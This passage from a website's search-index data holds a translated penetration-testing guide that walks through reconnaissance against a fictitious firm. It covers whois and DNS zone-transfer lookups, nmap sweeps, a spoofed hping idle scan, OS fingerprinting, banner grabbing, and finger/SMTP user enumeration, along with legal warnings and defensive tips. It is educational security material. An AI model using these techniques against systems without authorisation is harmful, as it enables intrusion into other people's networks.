change the value of a command:\neeprom boot-device=disk2 eeprom auto-boot?=true Synchronize the PROM linkTo synchronize the PROM if the system is not responding, for example:\nok sync "
            }
        );
    index.add(
            {
                id:  816 ,
                href: "\/Tests_d\u0027intrusion\/",
                title: "Penetration Testing",
                description: "A comprehensive guide to penetration testing methodologies, including information gathering, vulnerability analysis, and exploitation techniques.",
                content: "Introduction linkOnce a network is installed and configured, it continuously evolves. New systems are added, old and faithful machines disappear - everything changes constantly. Users can also make modifications to the network without the administrator’s knowledge.\nTo verify the state of a network, an administrator must behave like a hacker and attempt to penetrate their own defenses. This article presents the methodology to follow.\nIt’s important to test the security of your own network by putting yourself in the hacker’s position to discover potential vulnerabilities. These tests are broken down into several steps:\nApproach Phase: Gathering information about the target network Analysis Phase: Using the results obtained in the previous step to determine potential vulnerabilities and the tools needed to exploit them Attack Phase: Taking action Before undertaking the final step, the network administrator must explicitly give their consent, and not just verbal approval. Chapter III of the Criminal Code deals with attacks on automated data processing systems. It contains 7 articles, here are the first three:\nArticle 323-1: Fraudulently accessing or maintaining access to all or part of an automated data processing system is punishable by one year imprisonment and a fine of 15,000 Euros. When this results in either the deletion or modification of data contained in the system, or an alteration of the operation of this system, the penalty is two years imprisonment and a fine of 17,500 Euros.\nArticle 323-2: Hindering or distorting the operation of an automated data processing system is punishable by three years imprisonment and a fine of 30,000 euros. Article 323-3: Fraudulently introducing data into an automated data processing system or fraudulently deleting or modifying data it contains is punishable by three years imprisonment and a fine of 15,000 Euros. Article 323-1 concerns the intrusion itself. When it also causes alteration of the system data, the penalty is increased. Article 323-2 deals with damage done to the network (viruses, mail bombing, DoS, etc.). Finally, Article 323-3 punishes changes deliberately made to data present on the network (meaning both high scores in games like xbill as well as network configuration files).\nTesting network security generally means “resistance to external threats”. However, many malicious operations can easily be conducted from a machine within the network itself (viruses, backdoors, sniffers, etc.). These sources of danger are rarely taken into consideration when evaluating the network. Similarly, most of the attacks presented in Eric Detoisien’s article should also be evaluated (spoofing, (D)DoS, etc.).\nVarious scenarios can be used for penetration testing:\nThe tester knows nothing about the target network and has no access to it; this is an external penetration test The tester has minimal privileges on the target network (any user account). They try to increase their privileges from inside the network itself (unactivated screen savers, sniffing, exploitation of local vulnerabilities, etc.). In this case, it is an internal penetration test. The results obtained should allow for better identification and correction of potential or existing problems on the target network. For example, the administrator’s behavior in response to intrusion attempts or a successful intrusion should be evaluated (will it be detected? How long will it take? etc.)\nThe Information War linkWe are now assuming the role of someone trying to gather as much information as possible about a target network. This collection is divided into two stages. First, we’ll gather all available information without directly accessing the target’s resources. Then, when we begin to have a clearer idea of what we’re dealing with, we’ll directly access the resources provided by the target.\nIndirect Queries linkIn this category, we include all means that allow us to learn more about the target without directly contacting it. This information is available - you just need to know where to look.\nInterrogation of Whois Databases linkWhois servers, also called nicname (port 43), provide access to the database of information provided when registering a domain name:\nAdministrative information such as names, phone numbers and addresses for different contacts (admin-c, tech-c, zone-c, bill-c…) Technical information such as DNS name(s), email addresses of the officials mentioned above, IP address ranges allocated to the target… This database, formerly managed by InterNIC and now by Network Solutions, remains easily accessible to everyone as it allows verification of domain name availability.\nCompanies that register domain names generally offer an online query service (see Table 1). On Unix, there is also the whois command.\nName Meaning URL Description AFNIC Association Française pour le Nommage Internet en Coopération http://www.nic.fr/cgi-bin/whois all “.fr” domains RIPE Réseau IP Européen http://www.ripe.net/cgi-bin/whois covers Europe, Middle East and some Asian and African countries InterNIC Stated on their webpage: “InterNIC is a registered service mark of the U.S. Department of Commerce. This site is being hosted by ICANN on behalf of the U.S. Department of Commerce”. http://www.internic.net/whois.html “.com”, “.net”, “.edu” and other “.org” domains To show you the richness of information contained in this type of database, here’s a small example using a domain name (fictitious for confidentiality reasons):\nwhois pigeons.fr@whois.nic.fr [whois.nic.fr] Tous droits reserves par copyright. Voir http://www.nic.fr/outils/dbcopyright.html Rights restricted by copyright. See http://www.nic.fr/outils/dbcopyright.html domain: pigeons.fr descr: PIGEON ET CIE descr: 10 RUE DE PARIS descr: 75001 Paris admin-c: BPxxx-FRNIC tech-c: LPxxx-FRNIC zone-c: CPxxx-FRNIC nserver: ns1.pigeons.fr nserver: ns2.pigeons.fr nserver: ns.heberge.fr mnt-by: FR-NIC-MNT mnt-lower: FR-NIC-MNT changed: frnic-dbm-updates@nic.fr 20001229 source: FRNIC role: HEBERGE Hostmaster address: Heberge Telecom address: 10 rue de Gennevilliers address: 92230 Gennevilliers phone: +33 1 41 00 00 00 fax-no: +33 1 41 00 00 01 e-mail: hostmaster@heberge.fr admin-c: AAxxx-FRNIC tech-c: BBxxx-FRNIC nic-hdl: CCxxx-FRNIC notify: hm-dbm-msgs@ripe.net mnt-by: HEBERGE-NOC changed: hostmaster@heberge.fr 20000814 changed: migration-dbm@nic.fr 20001015 source: FRNIC person: Bernard Pigeon address: PIGEON ET CIE address: 10 RUE DE PARIS address: 75001 Paris address: France phone: +33 1 53 00 00 00 fax-no: +33 1 53 00 00 01 e-mail: bernard.pigeon@pigeons.fr nic-hdl: BPxxxx-FRNIC notify: bernard.pigeon@pigeons.fr mnt-by: HEBERGE-NOC changed: bernard.pigeon@pigeons.fr 20001228 source: FRNIC person: Luc Pigeon address: PIGEON ET CIE address: 10 RUE DE PARIS address: 75001 Paris address: France phone: +33 1 53 00 00 00 fax-no: +33 1 53 00 00 01 e-mail: luc.pigeon@pigeons.fr nic-hdl: LPxxx-FRNIC mnt-by: HEBERGE-NOC changed: aaa@heberge.fr 20001228 source: FRNIC We learn that the company Pigeon et Cie is actually hosted by Heberge Telecom. The email addresses probably correspond to aliases, but they also provide clues about the existence of accounts on machines: if the corresponding passwords are weak (like first names, birth dates…), this information could be useful.\nAlso via whois databases, more advanced searches using an IP address belonging to Pigeon et Cie lead us to discover the IP address ranges allocated to them. For this, we use the RIPE whois database which proves to be the most relevant:\nwhois 10.51.23.246@whois.ripe.net % This is the RIPE Whois server. % The objects are in RPSL format. % Please visit http://www.ripe.net/rpsl for more information. % Rights restricted by copyright. % See http://www.ripe.net/ripencc/pub-services/db/copyright.html inetnum: 10.51.23..0 - 10.51.23.255 netname: PIGEON-CIE descr: Pigeon et Cie country: FR admin-c: OMxxxx-RIPE tech-c: OMxxxx-RIPE status: ASSIGNED PA notify: admin@pigeons.fr mnt-by: PC-XXX changed: admin@pigeons.fr 20000223 source: RIPE In addition, cross-searches on recovered names can give us additional information about the target (discovering new IP addresses or new DNS servers).\nThe outcome of whois database searches is very conclusive as we have retrieved:\nThe DNS servers with authority over the pigeons.fr domain The contact details of administrative and technical contacts related to Pigeon et Cie The IP address ranges allocated to Pigeon et Cie. We can still continue to gather information on the internet.\nNews Groups linkAdministrators or developers often face problems. To solve them, they use NewsGroups to ask questions. Unfortunately, they often give too much information about their information system (technology, versions of applications used, code fragments…). To do research, we can ask groups.google.com with search criteria like @pigeons.fr for example. This very powerful search engine will return all messages posted by people from Pigeon et Cie. In addition to technical information, we can obtain information about the personal tastes of certain people in the company. This information will be useful when searching for passwords or improving a potential Social Engineering attempt (explained later).\nSearch Engines linkSame principle as for NewsGroups, we try to retrieve other data about the target information system using a search engine. The keywords used are limited only by our imagination. Again, www.google.com is very effective especially thanks to its cache. Nevertheless, meta-engines like www.dogpile.com give relevant results by multiplying searches across several engines.\nSocial Engineering linkWe’re departing a bit from indirect queries since this technique involves direct contact with the target. However, this approach is still not technical which is why it’s not part of direct queries. Social engineering is practiced to obtain confidential information (password, technical information, phone number, IP address…) from users of the target information system. All possible and imaginable means are available (telephone, email, fax…). With identity theft and clever use of information previously gathered about people and the company, credibility is achieved along with valuable data.\nMiscellaneous linkIndirect queries are virtually unlimited; a hacker has time on their side and will check the company’s website or its subsidiaries. Other data on companies and brands can be found on sites like www.societe.com or in yellow pages (phone numbers or people’s names). The results obviously depend on the hacker’s creativity.\nDirect Queries linkThe information gathered so far does not come directly from the target. We will now launch some probes in its direction and see what we can retrieve.\nFrom the target’s perspective, we’ll also see how to thwart certain queries. Unlike previous steps, the target now controls the data that the tester is looking for. It’s up to them to limit it to the minimum.\nDNS Interrogation linkThe whois query shows us the DNS servers used. What can these reveal to us?\nTo get information from these servers, simply query them in a language they understand, namely the DNS protocol. Several queries are at our disposal:\nRetrieving all DNS servers with authority over the domain host -v -t ns pigeons.fr ns1.pigeons.fr Using domain server: Name: ns1.pigeons.fr Address: 10.250.149.163 Aliases: Trying null domain rcode = 0 (Success), ancount=3 The following answer is not verified as authentic by the server: pigeons.fr\t172800 IN\tNS\tns1.pigeons.fr pigeons.fr\t172800 IN\tNS\tns2.pigeons.fr pigeons.fr\t172800 IN\tNS\tns.heberge.fr Additional information: ns1.pigeons.fr\t172800 IN\tA\t10.250.149.163 ns2.pigeons.fr\t172800 IN\tA\t10.250.149.165 ns.heberge.fr\t345317 IN\tA\t10.51.3.65 So we have confirmation of the DNS servers used and their IP addresses.\nRetrieving mail servers (Mail eXchanger) for the domain host -v -t mx pigeons.fr ns1.pigeons.fr Using domain server: Name: ns1.pigeons.fr Address: 10.250.149.163 Aliases: Trying null domain rcode = 0 (Success), ancount=1 The following answer is not verified as authentic by the server: pigeons.fr\t172800 IN\tMX\t0 smtp1.pigeons.fr For authoritative answers, see: pigeons.fr\t172800 IN\tNS\tns1.pigeons.fr pigeons.fr\t172800 IN\tNS\tns2.pigeons.fr pigeons.fr\t172800 IN\tNS\tns.heberge.fr Additional information: smtp1.pigeons.fr\t172800 IN\tA\t10.250.149.35 ns1.pigeons.fr\t172800 IN\tA\t10.250.149.163 ns2.pigeons.fr\t172800 IN\tA\t10.250.149.165 ns.heberge.fr\t345239 IN\tA\t10.51.3.65 Verification of the two previous queries host -a pigeons.fr ns1.pigeons.fr Using domain server: Name: ns1.pigeons.fr Address: 10.250.149.163 Aliases: Trying null domain rcode = 0 (Success), ancount=5 The following answer is not verified as authentic by the server: pigeons.fr\t172800 IN NS\tns1.pigeons.fr pigeons.fr\t172800 IN SOA\tns1.pigeons.fr dnsmaster.pigeons.fr( 2000060601 ;;;serial (version) 21600\t;;refresh period 3600\t;;retry refresh this often 3600000\t;;expiration period 172800\t;;minimum TTL ) pigeons.fr\t172800 IN\tNS\tns2.pigeons.fr pigeons.fr\t172800 IN\tNS\tns.heberge.com pigeons.fr\t172800 IN\tMX\t0 smtp1.pigeons.fr For authoritative answers, see: pigeons.fr\t172800 IN\tNS\tns1.pigeons.fr pigeons.fr\t172800 IN\tNS\tns2.pigeons.fr pigeons.fr\t172800 IN\tNS\tns.heberge.fr Additional information: ns1.pigeons.fr\t172800 IN\tA\t10.250.149.163 ns2.pigeons.fr\t172800 IN\tA\t10.250.149.165 ns.heberge.fr\t345225 IN\tA\t10.51.3.65 smtp1.pigeons.fr\t172800 IN\tA\t10.250.149.35 Now we have all the information we could easily and consistently retrieve. Let’s explore the pigeons.fr domain further by looking for information on machines present on the network:\nThe zone transfer returns the entire configuration of the DNS server\nhost -l pigeons.fr ns1.pigeons.fr Using domain server: Name: ns1.pigeons.fr Address: 10.250.149.163 Aliases: pigeons.fr name server ns1.pigeons.fr pigeons.fr name server ns2.pigeons.fr pigeons.fr name server ns.heberge.fr m01.pigeons.fr has address 10.51.23.226 m02.pigeons.fr has address 10.51.23.227 www2.pigeons.fr has address 10.51.23.247 m03.pigeons.fr has address 10.51.23.228 m04.pigeons.fr has address 10.51.23.229 m05.pigeons.fr has address 10.51.23.230 m10.pigeons.fr has address 10.51.23.238 m09.pigeons.fr has address 10.51.23.237 m12.pigeons.fr has address 10.250.149.162 m13.pigeons.fr has address 10.250.149.163 m14.pigeons.fr has address 10.250.149.165 m16.pigeons.fr has address 10.51.23.251 m39.pigeons.fr has address 10.51.23.249 w3.pigeons.fr has address 10.101.154.68 w5.pigeons.fr has address 10.101.154.67 w7.pigeons.fr has address 10.101.154.73 w8.pigeons.fr has address 10.101.154.77 w9.pigeons.fr has address 10.101.154.79 w5-private.pigeons.fr has address 10.101.154.70 w3-ccc.pigeons.fr has address 10.101.154.72 w3-bbb.pigeons.fr has address 10.101.154.71 www.pigeons.fr has address 10.51.23.246 Luck is on our side: a misconfiguration has allowed us to list all the machines in the pigeons.fr domain. Otherwise, we would have repeated the same operation on the other DNS servers because often the main server is well configured unlike the others.\nOther tests are interesting when zone transfer is impossible. For example, we can check if it’s possible to retrieve internal addressing. host -a 0.168.192.in-addr.arpa ns1.pigeon2.com Using domain server: Name: ns1.pigeons2.fr Address: 10.81.144.121 Aliases: Trying null domain rcode = 0 (Success), ancount=4 The following answer is not verified as authentic by the server: 0.168.192.in-addr.arpa 3600 IN NS server2.pigeons2.fr 0.168.192.in-addr.arpa 3600 IN NS server1.pigeons2.fr 0.168.192.in-addr.arpa 3600 IN NS echange.pigeons2.fr 0.168.192.in-addr.arpa 3600 IN SOA server1.pigeons2.fr root.pigeons2.fr( 585 ;;serial (version) 900 ;;refresh period 600 ;;retry refresh this often 86400 ;;expiration period 3600 ;;minimum TTL ) Additional information: server2.pigeons2.fr 3600 IN A 192.168.0.1 server1.pigeons2.fr 3600 IN A 192.168.0.2 server1.pigeons2.fr 3600 IN A 10.81.144.121 echange.pigeons2.fr 3600 IN A 192.168.0.3 We’ve used a different target here since the previous zone transfer didn’t show us any machines with private addressing (like 192.168.0.1). We see that the zone 0.168.192.in-addr.arpa is managed by the DNS server ns1.pigeons2.fr. It’s therefore sufficient to test all machines in the 192.168.0.* network.\nhost 192.168.0.1 ns1.pigeons2.fr 1.0.168.192.IN-ADDR.ARPA 1200 IN PTR server1.pigeons2.fr All that remains is to create a small script (in Perl for example) that repeats this command for addresses from 192.168.0.1 to 192.168.0.254.\nFinally, in the case of Bind only, we can obtain its version, which is very interesting given this server’s long history of remote exploits. nslookup Default Server: ns1.pigeons.fr Address: 10.250.149.163 \u003e set class=chaos \u003e set query=txt \u003e version.bind Server: ns1.pigeons.fr Address: 10.250.149.163 VERSION.BIND text = \"8.2.3-REL\" We get the Bind version, which could allow us to find a potential vulnerability in this version (a buffer overflow for example).\nUsing Ping linkThe indirect queries (whois) and DNS interrogation have allowed us to retrieve IP addresses and IP address ranges belonging to the target. By pinging each of these IP addresses, we’ll know which ones are accessible. However, we must take into account that the presence of a firewall might prevent the machine from responding to pings. Port scanning will solve this problem by detecting the presence of the machine if it has an open port. Nmap performs this task very well:\nnmap -sP 10.51.23.* -n Starting nmap V. 2.54BETA25 ( www.insecure.org/nmap/ ) Host (10.51.23.226) appears to be up. Host (10.51.23.227) appears to be up. Host (10.51.23.228) appears to be up. Host (10.51.23.229) appears to be up. Host (10.51.23.230) appears to be up. Host (10.51.23.237) appears to be up. Host (10.51.23.238) appears to be up. Host (10.51.23.246) appears to be up. Host (10.51.23.247) appears to be up. Host (10.51.23.249) appears to be up. Host (10.51.23.251) appears to be up. Nmap run completed -- 256 IP addresses (11 hosts up) scanned in 2 seconds Using Traceroute linkThe goal here is to obtain the IP address of an access router to the target machines. For this, simply do a traceroute to a machine on the target network:\ntraceroute 10.51.23.251 traceroute 10.101.154.70 1 10.0.0.1 1.612 ms 1.443 ms 1.532 ms 2 10.18.23.5 5.790 ms 5.454 ms 5.536 ms 3 10.20.20.1 5.605 ms 5.453 ms 5.338 ms 4 10.51.15.1 6.805 ms 6.437 ms 6.552 ms 5 10.51.192.7 7.783 ms 7.246 ms 7.329 ms 6 10.51.173.65 7.402 ms 7.246 ms 7.732 ms 7 10.51.159.33 7.582 ms 7.844 ms 7.935 ms 8 10.51.23.1 8.202 ms 7.639 ms 7.909 ms 9 10.51.23.251 7.807 ms 7.633 ms 7.733 ms The machine just before the destination is a router.\nPort Scan linkThere is a wide variety of methods for scanning, the description of which is far beyond the scope of this article. The general principle of any scanning method is to send a packet (TCP, UDP, ICMP…) to the target machine and see what happens. Depending on the method used, the tester determines the state of the port (open, closed, filtered).\nThe purpose of scanning is similar to that of a scout. The tester (or hacker) thus determines the role of machines, available services, supported protocols… At the end of the operation, the following information is obtained:\nThe IP addresses of the machines on the network The list of available services The list of different supported protocols (TCP, UDP, ICMP…) For a maximum number of machines, the state of each of its ports. For an administrator, this step reveals access to their machines. They should also install tools allowing them to detect scans that they have not initiated themselves (iplog or portsentry for example).\nThere are different solutions to escape this kind of detector, by spoofing IP addresses or distributing the scan from several machines.\nFor example, when the source address of the packet is spoofed, the test machine remains unknown to the target machine, although it knows it has been scanned:\nkelly (192.168.1.3) the test machine bosley (192.168.1.2) a quiet machine (i.e. that doesn’t generate a lot of traffic) charly (192.168.1.1) the target machine. To detect if a TCP port allows packets to pass through, kelly regularly sends packets to bosley. If bosley generates little traffic on the network, the id field of its packets varies little. At the same time, kelly sends TCP packets to charly with the SYN flag activated (as for a normal connection request), but putting bosley’s address as the source address. Thus, charly responds to bosley with SYN-ACK packets if the port is open. bosley, which hasn’t requested anything, sends a RST packet to charly to cut the connection. As a result, the id field increases because two packets are emitted (the RST and the response to kelly):\nhping -r bosley 46 bytes from 192.168.1.2: flags=RA seq=1 ttl=255 id=+1 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=2 ttl=255 id=+1 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=3 ttl=255 id=+1 win=0 rtt=0.4 ms 46 bytes from 192.168.1.2: flags=RA seq=4 ttl=255 id=+1 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=5 ttl=255 id=+2 win=0 rtt=0.4 ms 46 bytes from 192.168.1.2: flags=RA seq=6 ttl=255 id=+2 win=0 rtt=0.4 ms 46 bytes from 192.168.1.2: flags=RA seq=7 ttl=255 id=+3 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=8 ttl=255 id=+2 win=0 rtt=0.4 ms 46 bytes from 192.168.1.2: flags=RA seq=9 ttl=255 id=+2 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=10 ttl=255 id=+1 win=0 rtt=0.4 ms 46 bytes from 192.168.1.2: flags=RA seq=11 ttl=255 id=+1 win=0 rtt=0.4 ms Simultaneously from another terminal:\nhping -a bosley -p 22 -S charly eth0 default routing interface selected (according to /proc) HPING charly (eth0 192.168.1.1): S set, 40 headers + 0 data bytes --- charly hping statistic --- 6 packets tramitted, 0 packets received, 100% packet loss It’s normal that kelly doesn’t receive any response from charly since they’re sent to bosley.\nOn the contrary, when the target port is not open, charly doesn’t emit any packet. The id field then doesn’t vary:\nhping -r bosley .. 46 bytes from 192.168.1.2: flags=RA seq=61 ttl=255 id=+1 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=62 ttl=255 id=+1 win=0 rtt=0.3 ms 46 bytes from 192.168.1.2: flags=RA seq=63 ttl=255 id=+1 win=0 rtt=0.4 ms 46 bytes from 192.168.1.2: flags=RA seq=64 ttl=255 id=+1 win=0 rtt=0.3 ms .. The target port (hping -a bosley -p 80 -S charly) is therefore closed. Charly’s logs contain a connection attempt from bosley.\nTo mislead a scan, it’s also possible to run a honeypot. This looks like a server, tastes like a server, but it’s not a real server:\n/* fake.c : just a socket bound to a port */ #include #include #include #include #include #include main(int argc,char *argv[]) { int port; //port number struct sockaddr_in sock; //the socket for the server int sd; //socket descriptor if (argc!=2) exit(EXIT_FAILURE); port = htons(atoi(argv[1])); if ( (sd = socket(AF_INET, SOCK_STREAM, 0)) == -1) { perror(\"No socket\"); exit(EXIT_FAILURE); } sock.sin_family = AF_INET; sock.sin_port = port; sock.sin_addr.s_addr = INADDR_ANY; if (bind(sd, (struct sockaddr*)\u0026sock, sizeof(struct sockaddr)) == -1) { perror(\"can't bind\"); exit(EXIT_FAILURE); } /* Let's go for LISTEN mode */ if (listen(sd, 2) == -1) { perror(\"Bad listen\"); exit(EXIT_FAILURE); } while(1) sleep(1); } You just need to put it on the port of your choice:\ngcc -o fake fake.c ./fake 21 \u0026 [2] 3373 lsof -ni | grep fake fake 3373 root 3u IPv4 201230 TCP *:ftp (LISTEN) nmap charly Starting nmap V. 2.54BETA22 ( www.insecure.org/nmap/ ) Interesting ports on charly (192.168.1.1): (The 1538 ports scanned but not shown below are in state: closed) Port State Service 21/tcp open ftp 22/tcp open ssh 6000/tcp open X11 We launch our fake server on port 21 (ftp). lsof reveals that a server is listening on this port 21. However, nmap (port scanner) is fooled because it just tries to open a connection on port 21. Since it succeeds, it believes it’s an ftp server. The illusion works with this type of network scanner because they don’t actually try to connect. Any more in-depth connection will reveal the deception, unless the fake server is refined (for example by adding banners to simulate the desired service). Note that the nc command (netcat) produces a similar result (nc -l -p 21 to listen on port 21).\nThis kind of defense is called a honeypot. Projects like honeynets and honeypots set up networks, or machines, designed to attract hackers to learn their techniques.\nScanning a machine always comes down to sending a packet from the test machine to the target machine, regardless of the method used. Depending on the target machine’s resources (i.e. the security expected on it), an attempt with 2 packets per day is enough to detect the scan. Large disks are then needed and all packets arriving on the machine must be recorded for analysis over several days in order to reconstruct the scan.\nOS Fingerprinting linkThanks to the network scan, we now know the active machines. We refine our knowledge by determining their operating system. This knowledge will allow us, when we have also determined the version of the daemons waiting on the target machine’s ports, to search for the exploits necessary for our penetration tests.\nEach OS has its own design for managing network protocols. On one hand, some fields are left to the OS (TTL, ToS, Win, DF…). On the other hand, even if RFCs define the essentials, they are not always scrupulously respected. Moreover, while they do prohibit certain packet configurations, they don’t specify how to respond to them. For example, what to do with a packet containing flag 64, which is undefined? Each has its own solution.\nDefault values in packets:\nBy retrieving packets issued by the target, we discover the value of parameters:\nthe TTL (time to live) field of outgoing packets; the window size; the DF bit (Don’t Fragment); the TOS field (Type Of Service). … Depending on the OS, all these parameters change. A database containing their default values then facilitates identification. It’s sufficient to send different packets to test the responses and then compare them to a signature database to identify the OS.\nFor example, the id field makes it easy to distinguish between Linux 2.2.x and 2.4.x (the command hping -1 -c 3 sends 3 packets of type 1 i.e. ICMP):\nuname -a Linux charly 2.4.4 #4 Wed May 23 10:18:08 CEST 2001 i686 unknown hping -1 -c 3 charly 28 bytes from 192.168.1.1: icmp_seq=0 ttl=255 id=0 rtt=0.4 ms 28 bytes from 192.168.1.1: icmp_seq=1 ttl=255 id=0 rt t=0.3 ms 28 bytes from 192.168.1.1: icmp_seq=2 ttl=255 id=0 rtt=0.3 ms uname -a Linux kelly 2.2.19ow1 #2 Mon May 21 12:29:48 CEST 2001 i686 unknown hping -1 -c 3 kelly 28 bytes from 128.93.24.10: icmp_seq=0 ttl=255 id=4901 rtt=0.3 ms 28 bytes from 128.93.24.10: icmp_seq=1 ttl=255 id=4903 rtt=0.2 ms 28 bytes from 128.93.24.10: icmp_seq=2 ttl=255 id=4906 rtt=0.2 ms The TCP/IP Stack\nHowever, this method is not very reliable because OSes often allow some of these values to be modified (with sysctl under Linux or in the registry for Windows).\nA more effective method is to analyze the target OS’s responses to certain packets: the tester then knows the behavior of the target’s TCP/IP stack, which is enough to identify the OS if the tests are well chosen.\nnmap (again and again ;) uses exactly this approach when the -O option (OS identification) is activated. A database contains the typical responses according to the OS. Thus, the fingerprint of Linux kernels 2.4.0 - 2.4.5 corresponds to:\nContributed by root@dexter.dynu.com Fingerprint Linux Kernel 2.4.0 - 2.4.5 (X86) TSeq(Class=RI%gcd=\u003c6%SI=\u003c2983C7E\u0026\u003e3DAF6%IPID=Z%TS=100HZ) T1(DF=Y%W=16A0|7FFF%ACK=S++%Flags=AS%Ops=MNNTNW) T2(Resp=N) T3(Resp=Y%DF=Y%W=16A0|7FFF%ACK=S++%Flags=AS%Ops=MNNTNW) T4(DF=Y%W=0%ACK=O%Flags=R%Ops=) T5(DF=Y%W=0%ACK=S++%Flags=AR%Ops=) T6(DF=Y%W=0%ACK=O%Flags=R%Ops=) T7(DF=Y%W=0%ACK=S++%Flags=AR%Ops=) PU(DF=Y|N%TOS=C0|0%IPLEN=164%RIPTL=148%RID=E%RIPCK=E%UCK=E|F%ULEN=134%DAT=E) The tests themselves are described by the Ti lines. Reading Fyodor’s article in phrack will detail them for you (phrack 54, file 9/12). However, let’s briefly reveal the meaning of each:\nTSeq: describes the nature of the sequence number incrementation T1: TCP packet with SYN|64 flag (since 64 doesn’t correspond to any flag value, the packet is “syn-bugged”) to an open port T2: NULL TCP packet, i.e. containing no option or flag, to an open port T3: TCP packet with SYN|FIN|URG|PSH flags to an open port T4: TCP packet with ACK flag to an open port T5: TCP packet with SYN flag to a closed port T6: TCP packet with ACK flag to a closed port T7: TCP packet with FIN|PSH|URG flags to a closed port PU: UDP packet sent to a closed port to retrieve an ICMP “port unreachable” packet. While it’s often possible to modify the values of certain parameters, modifying the complete behavior of the stack is much more difficult, or even impossible with some OSes whose sources are not available.\nBanners linkThe objective is simple: to know the version of the application used for a specific service. Most of the time, a simple telnet on the desired port gives us the information. Note the few services that don’t deliver this information: finger (port 79), exec (port 512), login (port 513), printer (port 515).\nThere’s also an article on this wiki: Banners: Hiding Application Banners (Service banner faking)\nFTP (port 21): Often the version is revealed at login:\ntelnet ftp.pigeons.fr Trying 192.168.14.35... Connected to ftp.pigeons.fr Escape character is '^]'. 220 ProFTPD 1.2.0pre9 Server (ProFTPD) [ftp1-1.pigeons.fr However, some servers allow the banner to be hidden. The STAT command can save us:\ntelnet ftp.pigeons2.fr 21 Trying 192.168.96.24... Connected to ftp.pigeons2.fr. Escape character is '^]'. 220 ftp.pigeons2.fr FTP server ready. USER ftp 331 Guest login ok, send your complete e-mail address as password. PASS raynal@home.net 230 Guest login ok, access restrictions apply. STAT 211-ftp.pigeons2.fr FTP server status: Version wu-2.6.1(1) Fri Feb 16 19:32:14 CET 2001 Connected to bosley (192.168.1.2) Logged in anonymously TYPE: ASCII, FORM: Nonprint; STRUcture: File; transfer MODE: Stream No data connection 0 data bytes received in 0 files 0 data bytes transmitted in 0 files 0 data bytes total in 0 files 144 traffic bytes received in 0 transfers 2502 traffic bytes transmitted in 0 transfers 2696 traffic bytes total in 0 transfers 211 End of status telnet (port 23): Even before the connection is validated by the password, the server returns the information we’re looking for:\ntelnet 192.168.1.1 Trying 192.168.1.1... Connected to charly (192.168.1.1). Escape character is '^]'. Red Hat Linux release 7.1 (Seawolf) Kernel 2.4.4 on an i686 If you really want to use telnet, the -h option will only display them once the client is authenticated.\nDNS (port 53): We’ve seen that it was quite simple to retrieve the version of a DNS server. However, it’s possible to fake this information by modifying the options field in /etc/named.conf:\n# /etc/named.conf ... options { directory \"/var/named\"; version \"What are you doing, dude !\"; }; HTTP (port 80): The HEAD command only returns the meta-information constituting the HTTP header:\ntelnet minimum 80 Trying 192.168.1.1... Connected to charly (192.168.1.1). Escape character is '^]'. HEAD / HTTP/1.0 HTTP/1.1 200 OK Date: Mon, 11 Jun 2001 19:28:57 GMT Server: Apache/1.3.19 (Unix) (Red-Hat/Linux) mod_ssl/2.8.1 OpenSSL/0.9.6 DAV/1.0.2 PHP/4.0.4pl1 mod_perl/1.24_01 Last-Modified: Thu, 29 Mar 2001 17:53:01 GMT ETag: \"731a-b4a-3ac3767d\" Accept-Ranges: bytes Content-Length: 78208 Connection: close Content-Type: text/html Connection closed by foreign host. Adding the line ServerToken Prod limits the information to the server name, i.e. Apache.\nportmap (port 111) and RPCs: As we detail later in this article, the rpcinfo command provides all versions of RPC services running on the target.\nidentd (port 113): Some versions support an extension to RFC 1413: the VERSION command:\ntelnet charly 113 Connected to charly... VERSION 0 , 0 : X-VERSION : pidentd 3.0.10 for Linux 2.2.5-22smp (Jul 20 2000 15:09:20) Servers that support this command often also have an option to disable it.\nInformation Related to Specific Protocols linkWe now know exactly what is running on each system (OS, servers, server versions…). We continue our quest for information because many servers still reveal a lot about the network and its users:\nfinger provides information about system users: finger @charly Login Name Tty Idle Login Time Office Office Phone detoisien Eric Detoisien pts/7 3d Jun 5 09:47 (jil) detoisien Eric Detoisien *pts/10 160d Jun 5 11:08 (kelly) raynal Frederic Raynal tty1 10d May 31 09:57 raynal Frederic Raynal pts/1 3d Jun 5 09:26 (:0) raynal Frederic Raynal pts/3 3d May 31 09:58 (:0) raynal Frederic Raynal pts/11 3d May 31 11:52 (:0) raynal Frederic Raynal pts/7 3d Jun 6 12:08 (:0) raynal Frederic Raynal pts/2 Jun 10 09:35 (bosley) root root pts/4 5d May 31 09:58 In addition, it’s possible to chain queries with the notation finger raynal@hots1@host2.\nThe mail server: the SMTP protocol (RFC 821) defines the VRFY and EXPN commands: VERIFY (VRFY)\nThis command asks the receiver to confirm that the provided arguments actually designate a user. If it is a username, the user’s full name (if known to the receiver) as well as the fully qualified mailbox should be returned to the requester.\nEXPAND (EXPN)\nThis command asks the receiver to confirm whether the associated argument identifies a mailing list, and, if so, to return the list members. The users’ full names (if known) and fully qualified mailbox addresses will be returned via a multiline response.\nOn charly, we obtain the following information:\nvrfy root 250 system PRIVILEGED account vrfy bin 250 system librarian account vrfy web 250 Web Server manager vrfy ftp 550 ftp... User unknown vrfy raynal 250 Frederic Raynal expn pigeons 050 pigeons... aliased to detoisien, pappy, raynal 050 /home/detoisien/.forward: line 1: forwarding to detoisien@pigeons.fr 050 /home/raynal/.forward: line 1: forwarding to \\raynal@charly.pigeons.fr 050 /home/raynal/.forward: line 2: forwarding to frederic.raynal@linuxmag.fr 250-Eric Detoisien 250-Frederic Raynal 250-Frederic Raynal \u003c\\raynal@charly.pigeons.fr\u003e 250-Frederic Raynal Most SMTP servers now allow these to be disabled, which is therefore recommended ;)\nidentd (formerly called auth, port 113 - RFC 1413) provides information about the identity of system users. It reveals the holder of a connection, which requires knowing the target and destination ports. For the target port, since we’re on our own machine, the netstat -A inet command reveals it. As for the destination port, we’ve already scanned the target machine! All we need to do now is connect to each of the open ports and then ask identd who is in charge of this connection. The result of scanning bosley is as follows:\n7/tcp open echo 22/tcp open ssh 80/tcp open http 113/tcp open auth 664/tcp open unknown 1024/tcp open kdm 1025/tcp open listen 6000/tcp open X11 We initialize a connection on port 